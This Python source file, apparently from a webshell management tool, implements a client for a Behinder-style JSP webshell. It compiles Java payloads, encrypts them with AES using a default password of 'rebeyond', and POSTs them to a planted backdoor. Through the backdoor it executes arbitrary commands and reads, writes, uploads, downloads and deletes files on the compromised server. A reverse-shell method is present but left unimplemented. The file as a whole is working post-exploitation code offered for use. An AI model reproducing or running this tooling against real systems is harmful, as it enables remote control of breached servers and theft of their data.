from pathlib import Path
import asyncio
import base64
import re
import json
import logging
import subprocess
import typing as t
import tempfile

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    BasicInfoEntry,
    Option,
    OptionGroup,
    DirectoryEntry,
    get_http_client,
)

from ..utils.tools import parse_permission, java_repr, md5_encode, base64_encode


logger = logging.getLogger("core.sessions.php_behinder")

PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"

def behinder_aes(payload: bytes, key: bytes) -> bytes:
    """Encrypt payload with Behinder AES format"""
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(payload, AES.block_size))
    return base64.b64encode(encrypted_data)


@register_session
class JSPWebshellBehinderAES:
    session_type = "BEHINDER_JSP_AES"
    readable_name = "[Test] Behinder JSP"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "Advanced Connection",
            "options": [
                Option(
                    id="timeout_refresh_client",
                    name="Refresh HTTP Session on timeout",
                    type="checkbox",
                    placeholder="Using the same PHPSESSID for long operations may block subsequent requests",
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="updownload_chunk_size",
                    name="Upload/Download chunk size",
                    type="text",
                    placeholder="Chunk size in bytes; note each chunk requires compiling payload",
                    default_value=str(1024 * 32),
                    alternatives=None,
                ),
                Option(
                    id="updownload_max_coroutine",
                    name="Upload/Download concurrency",
                    type="text",
                    placeholder="Maximum coroutines for file upload/download",
                    default_value="4",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "Other Settings",
            "options": [
                Option(
                    id="compile_max_coroutine",
                    name="Payload compile concurrency",
                    type="text",
                    placeholder="Maximum processes for compiling payload via javac",
                    default_value="4",
                    alternatives=None,
                ),
                Option(
                    id="javac_target_version",
                    name="javac source version",
                    type="text",
                    placeholder="Source version for javac (javac -source)",
                    default_value="1.8",
                    alternatives=None,
                ),
                Option(
                    id="javac_target_version",
                    name="javac target version",
                    type="text",
                    placeholder="Target version for javac (javac -target)",
                    default_value="1.8",
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
        self.updownload_chunk_size = int(
            session_conn.get("updownload_chunk_size", 1024 * 128)
        )
        self.updownload_max_coroutine = int(
            session_conn.get("updownload_max_coroutine", 4)
        )

        self.compile_semaphore = asyncio.Semaphore(
            int(session_conn.get("compile_max_coroutine", 4))
        )

        self.javac_source_version = session_conn.get("javac_source_version", "1.8")

        self.javac_target_version = session_conn.get("javac_target_version", "1.8")

    async def submit_code(self, action_code: str):
        code = PAYLOAD_PATH.read_text()
        code = re.sub(
            ".+ETHER_GHOST_REPLACE_HERE", f"Object data = {action_code};", code
        )
        data = None
        with tempfile.TemporaryDirectory(delete=False) as d:
            payload_code_filepath = Path(d) / "Payload.java"
            payload_bin_filepath = Path(d) / "Payload.class"
            payload_code_filepath.write_text(code)
            return_code = None
            async with self.compile_semaphore:
                p = subprocess.Popen(
                    [
                        "javac",
                        "-source",
                        self.javac_source_version,
                        "-target",
                        self.javac_target_version,
                        payload_code_filepath.as_posix(),
                    ]
                )
                while p.poll() is None:
                    await asyncio.sleep(0)
                return_code = p.wait()
            assert return_code == 0, f"javac exit with {return_code=}"
            assert payload_bin_filepath.exists(), "javac failed to build payload"
            data = behinder_aes(payload_bin_filepath.read_bytes(), self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            if response.status_code != 200:
                raise exceptions.TargetError(f"{response.status_code=}")
            try:
                data = json.loads(base64.b64decode(response.text))
            except Exception as e:
                raise exceptions.TargetError(
                    "Cannot decode response: " + repr(response.text)[:30]
                ) from e
            if data["code"] != 0:
                if data["error_type"] == "java.io.IOException":
                    raise exceptions.FileError(data["msg"])
                raise exceptions.TargetError(
                    f"{data['code']=} {data['error_type']=} {data['msg']=}"
                )
            return data["data"]
        except httpx.TimeoutException as exc:
            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
            # The server keeps waiting for that session id
            # Reusing the same session id can block subsequent requests
            # Drop the session id and use another client for the request
            if self.timeout_refresh_client:
                logger.warning("HTTP request to target timed out; trying to refresh HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP request to target timed out") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "Failed to send HTTP request to target: " + str(exc)
            ) from exc

    async def execute_cmd(self, cmd: str) -> str:
        return "\n".join(await self.submit_code(f"runCommand({java_repr(cmd)})"))

    async def test_usablility(self) -> bool:
        return (await self.submit_code("ping()"))["name"] == "EtherGhost JSP"

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        entries = await self.submit_code(f"listFiles({java_repr(dir_path)})")
        try:
            result = [
                DirectoryEntry(
                    name="..",
                    permission="777",
                    filesize=0,
                    entry_type="dir",
                )
            ] + [
                DirectoryEntry(
                    name=str(entry["name"]),
                    permission=parse_permission(entry["permission"]),
                    filesize=int(entry["filesize"]),
                    entry_type=entry["entry_type"],
                )
                for entry in entries
                if entry["entry_type"]
                in ["dir", "file", "link-dir", "link-file", "unknown"]
            ]
            return result
        except Exception as exc:
            raise exceptions.TargetRuntimeError(f"Failed to decode result: {exc}") from exc

    async def mkdir(self, dir_path: str) -> None:
        await self.submit_code(f"mkdir({java_repr(dir_path)})")

    async def get_file_contents(
        self, filepath: str, max_size: int | None = None
    ) -> bytes:
        """Get file contents as bytes, not a decoded string"""
        if max_size is None:
            max_size = self.updownload_chunk_size
        content_b64 = await self.submit_code(
            f"getFileContentsBase64({java_repr(filepath)}, {max_size})"
        )
        try:
            return base64.b64decode(content_b64)
        except Exception as exc:
            raise exceptions.TargetRuntimeError("Base64 decode failed") from exc

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        """Save file contents as bytes, not a decoded string"""
        await self.submit_code(
            f"putFileContents({java_repr(filepath)}, "
            f"base64Decode({java_repr(base64_encode(content))}))"
        )
        return True

    async def delete_file(self, filepath: str) -> bool:
        return await self.submit_code(f"deleteFile({java_repr(filepath)})")

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        await self.submit_code(
            f"moveFile({java_repr(filepath)}, {java_repr(new_filepath)})"
        )

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        await self.submit_code(
            f"copyFile({java_repr(filepath)}, {java_repr(new_filepath)})"
        )

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        semaphore = asyncio.Semaphore(self.updownload_max_coroutine)
        write_state_lock = asyncio.Lock()

        chunk_size = self.updownload_chunk_size
        coros: t.List[t.Awaitable] = []
        done_coro = 0
        done_bytes = 0
        filepath_status = await self.submit_code(
            f"checkUploadFilepath({java_repr(filepath)})"
        )
        if filepath_status == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("No permission to write file")
        if filepath_status == "WRONG_EXISTED":
            raise exceptions.FileError("File already exists")
        if filepath_status != "OK":
            raise exceptions.TargetRuntimeError("Unknown error while checking file path")

        async def upload_chunk(chunk: bytes):
            nonlocal done_coro, done_bytes
            filepath = None
            async with semaphore:
                chunk_b64 = base64_encode(chunk)
                filepath = await self.submit_code(
                    f"putTempFile(base64Decode({java_repr(chunk_b64)}))"
                )
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            return filepath

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        result = await self.submit_code(
            f"mergeFiles({java_repr(uploaded_chunks)}, {java_repr(filepath)})"
        )
        return result  # can only be true

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        filesize_text = await self.submit_code(f"getFileSize({java_repr(filepath)})")
        if filesize_text == "WRONG_NOT_EXISTS":
            raise exceptions.FileError("File does not exist")
        if filesize_text == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("No permission to read file")
        filesize = None
        try:
            filesize = int(filesize_text)
        except Exception as exc:
            raise exceptions.TargetRuntimeError(
                f"Failed to read file size: {filesize_text=}"
            ) from exc

        sem = asyncio.Semaphore(self.updownload_max_coroutine)
        write_state_lock = asyncio.Lock()
        chunk_size = self.updownload_chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def download_chunk(offset: int) -> bytes:
            nonlocal done_coro, coros, done_bytes
            result = None
            async with sem:
                await asyncio.sleep(0.01)  # we don't ddos
                result_b64 = await self.submit_code(
                    f"downloadPartialFileBase64("
                    f"{java_repr(filepath)}, {java_repr(offset)}, {java_repr(chunk_size)})"
                )
                if result_b64 == "WRONG_NOT_EXISTS":
                    raise exceptions.FileError("File does not exist or is not a regular file")
                elif result_b64 == "WRONG_NO_PERMISSION":
                    raise exceptions.FileError("No read permission")
                result = base64.b64decode(result_b64)
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(result)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )

            return result

        coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
        chunks = await asyncio.gather(
            *coros,
            return_exceptions=True,
        )
        result = b""
        for chunk_result in chunks:
            if not isinstance(chunk_result, bytes):
                exc = chunk_result if isinstance(chunk_result, Exception) else None
                raise exceptions.FileError(
                    "File download failed: " + str(chunk_result)
                ) from exc
            result += chunk_result
        return result

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        raise exceptions.ServerError("JSP webshell does not support this method yet")

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return []  # JSP webshell does not support this method yet

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        """Get current basic info"""
        info = await self.submit_code("get_basicinfo()")
        return [
            BasicInfoEntry(key="Current Directory", value=info["current_directory"]),
            BasicInfoEntry(key="System Version", value=info["system_version"]),
            BasicInfoEntry(key="Java Version", value=info["java_version"]),
            BasicInfoEntry(key="JSP Location", value=info["jsp_location"])
        ]

    async def open_reverse_shell(self, host: str, port: int) -> None:
        """Open a reverse shell"""
        # [TODO] implement this method
        raise exceptions.ServerError("JSP webshell does not support this method yet")

    async def get_pwd(self) -> str:
        return await self.submit_code("getPwd()")
